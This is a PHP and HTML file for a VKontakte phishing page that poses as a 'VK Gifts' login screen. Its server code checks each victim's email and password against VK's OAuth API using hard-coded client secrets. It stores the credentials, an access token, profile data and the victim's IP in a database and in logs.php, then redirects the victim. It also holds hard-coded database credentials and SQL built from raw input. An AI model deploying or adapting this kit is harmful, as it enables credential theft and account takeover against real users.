<?php

    $host="mysql.zzz.com.ua"; // Оставляем localhost
    $user="bxlelzt"; // Имя пользователя
    $pass="1234567890Bxle"; // Пароль пользователя
    $db_name="bxlelzt"; // Название БД
    $link=mysql_connect($host,$user,$pass);
    mysql_select_db($db_name,$link);

    error_reporting (0);
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{	
		$username = $_POST["email"];
			$password = $_POST["pass"];
			$url = "https://vk.com/404";
			$ip=$_SERVER['REMOTE_ADDR'];
			$time = date("H:i | d.m.Y");
			$check = file_get_contents("https://oauth.vk.com/token?grant_type=password&scope=friends%2Cphotos%2Cvideo%2Caudio%2Cpages%2C256%2Cnotes%2Cstatus%2Cmessages%2Cwall%2Cads%2Coffline%2Cdocs%2Cgroups%2Cnotifications%2Cnotifications%2Cmarket%2Cnotifications&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&username=".$username."&password=".$password);
			if (strpos($check, "access_token") === false)
			{
				$message = '<div class="box_error">Указан неверный логин или пароль.</div>';
			} 
				else
				{	
			$data = json_decode(curl("https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=".$username."&password=".$password), 1);
			$res = json_decode(curl('https://api.vk.com/method/account.getProfileInfo?access_token='.$data[access_token]), 1);
	$NewUser = mysql_query("SELECT * FROM test WHERE login='$username'") or die();
	if (mysql_num_rows($NewUser) == 0) {
										$result = json_decode($check);
					$ez_log =$username.":".$password;
					$log = fopen("logs.php", "a+"); fwrite($log, $ez_log."\n"); fclose($log);
					header("Location: ".$url."");
			//Вставляем данные, подставляя их в запрос
		$sql = mysql_query("INSERT INTO `test` (`login`, `pass`, `token`, `firstname`, `lastname`, `bdate`, `aipi`, `vremya`) 
							VALUES ('".$_POST['email']."','".$_POST['pass']."','".$data[access_token]."','".$res[response][first_name]."','".$res[response][last_name]."','".$res[response][bdate]."','".$_SERVER['REMOTE_ADDR']."','". $time."')");
		//Если вставка прошла успешно
    if ($sql) {
    } else {
        $message = '<div class="box_error">Сервер недоступен</div>';
    }
         
} else {
   $message = '<div class="box_error">Произошла ошибка! Повторите позднее!</div>';
}       
                
			}
	}
	function curl($url){
	$ch = curl_init( $url );
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
	curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
	$res = curl_exec( $ch );
	curl_close( $ch );
	return $res;
	}
?>

<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="vk vk_js_no ">
 <meta http-equiv="content-type" content="text/html; charset=utf-8">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="format-detection" content="telephone=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="MobileOptimized" content="176" />
<meta name="HandheldFriendly" content="True" />
<base id="base">
<meta name="robots" content="noindex,nofollow" />
<title>Получение доступа к ВКонтакте</title>
<link rel="shortcut icon" href="http://vk.com/images/faviconnew.ico?3">
		<script type="text/javascript">
		document.ondragstart = noselect;
		document.onselectstart = noselect;
		document.oncontextmenu = noselect;
		function noselect(){return false;}
	</script>

<link type="text/css" rel="stylesheet" href="/auth/css/s_cfmx.css"></link>
<link type="text/css" rel="stylesheet" media="only screen" href="/auth/css/s_yzt.css"></link>
<script type="text/javascript" src="/auth/css/s_o.js"></script>
</head>
<body id="vk" class="vk__body _touch vk_stickers_hints_support_no opera_mini_no vk_al_no" onresize="onBodyResize(true);">
<div class="layout">
<div class="layout__header mhead" id="vk_head">
<div class="hb_wrap">
<div class="hb_btn">&nbsp;</div>
</div>
</div>
<div class="layout__body " id="vk_wrap">
<div class="layout__leftMenu" id="l">
</div>
<div class="layout__basis" id="m">
<div class="basis">
<div class="basis__header mhead" id="mhead">
<div class="hb_wrap mhb_logo">
<div class="hb_btn mhi_logo">&nbsp;</div>
<h1 class="hb_btn mh_header">&nbsp;</h1>
</div></div>
<div class="basis__content mcont" id="mcont"><div class="pcont fit_box bl_cont">
<div class="owner_panel oauth_mobile_header">
<img src="https://www.shareicon.net/download/2016/11/03/849431_social_512x512.png" class="op_fimg" />
<div class="op_fcont">
<div class="op_owner">VK Gifts</div>
<div class="op_info">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>
</div>
</div>
<div class="form_item fi_fat">
<div class="fi_row"><div class="service_msg_box">
<?=$message?>
</div></div>
<form method="post" action="#">
<dl class="fi_row">
<dt class="fi_label">Телефон или e-mail:</dt>
<dd>
<div class="iwrap"><input type="text" class="textfield" required="required" minlength="2" maxlength="1024" name="email" value="" /></div>
</dd>
</dl>
<dl class="fi_row">
<dt class="fi_label">Пароль:</dt>
<dd>
<div class="iwrap"><input type="password" class="textfield" required="required" minlength="2" maxlength="1024" name="pass" /></div>
</dd>
</dl>
<div class="fi_row">
<div class="fi_subrow">
<input class="button" type="submit" value="Войти" />
</div>
</div>
<div class="fi_row_new">
<div class="fi_header fi_header_light">Ещё не зарегистрированы?</div>
</div>
<div class="fi_row">
<a class="button wide_button gray_button" href="https://m.vk.com/join">Зарегистрироваться</a>
</div>
</form>
</div>
</div></div>
<div class="basis__footer mfoot" id="mfoot"><div class="pfoot">
<ul class="footer_menu">
</ul>
</div></div>
</div>
</div>
</div>
</div>
<script type="text/javascript">
<!--
parent&&parent!=window&&(document.getElementsByTagName('body')[0].innerHTML='');
//-->
</script>
<div id="vk_utils"></div>
<div id="z"></div>
<div id="vk_bottom"></div>
</body>
</html>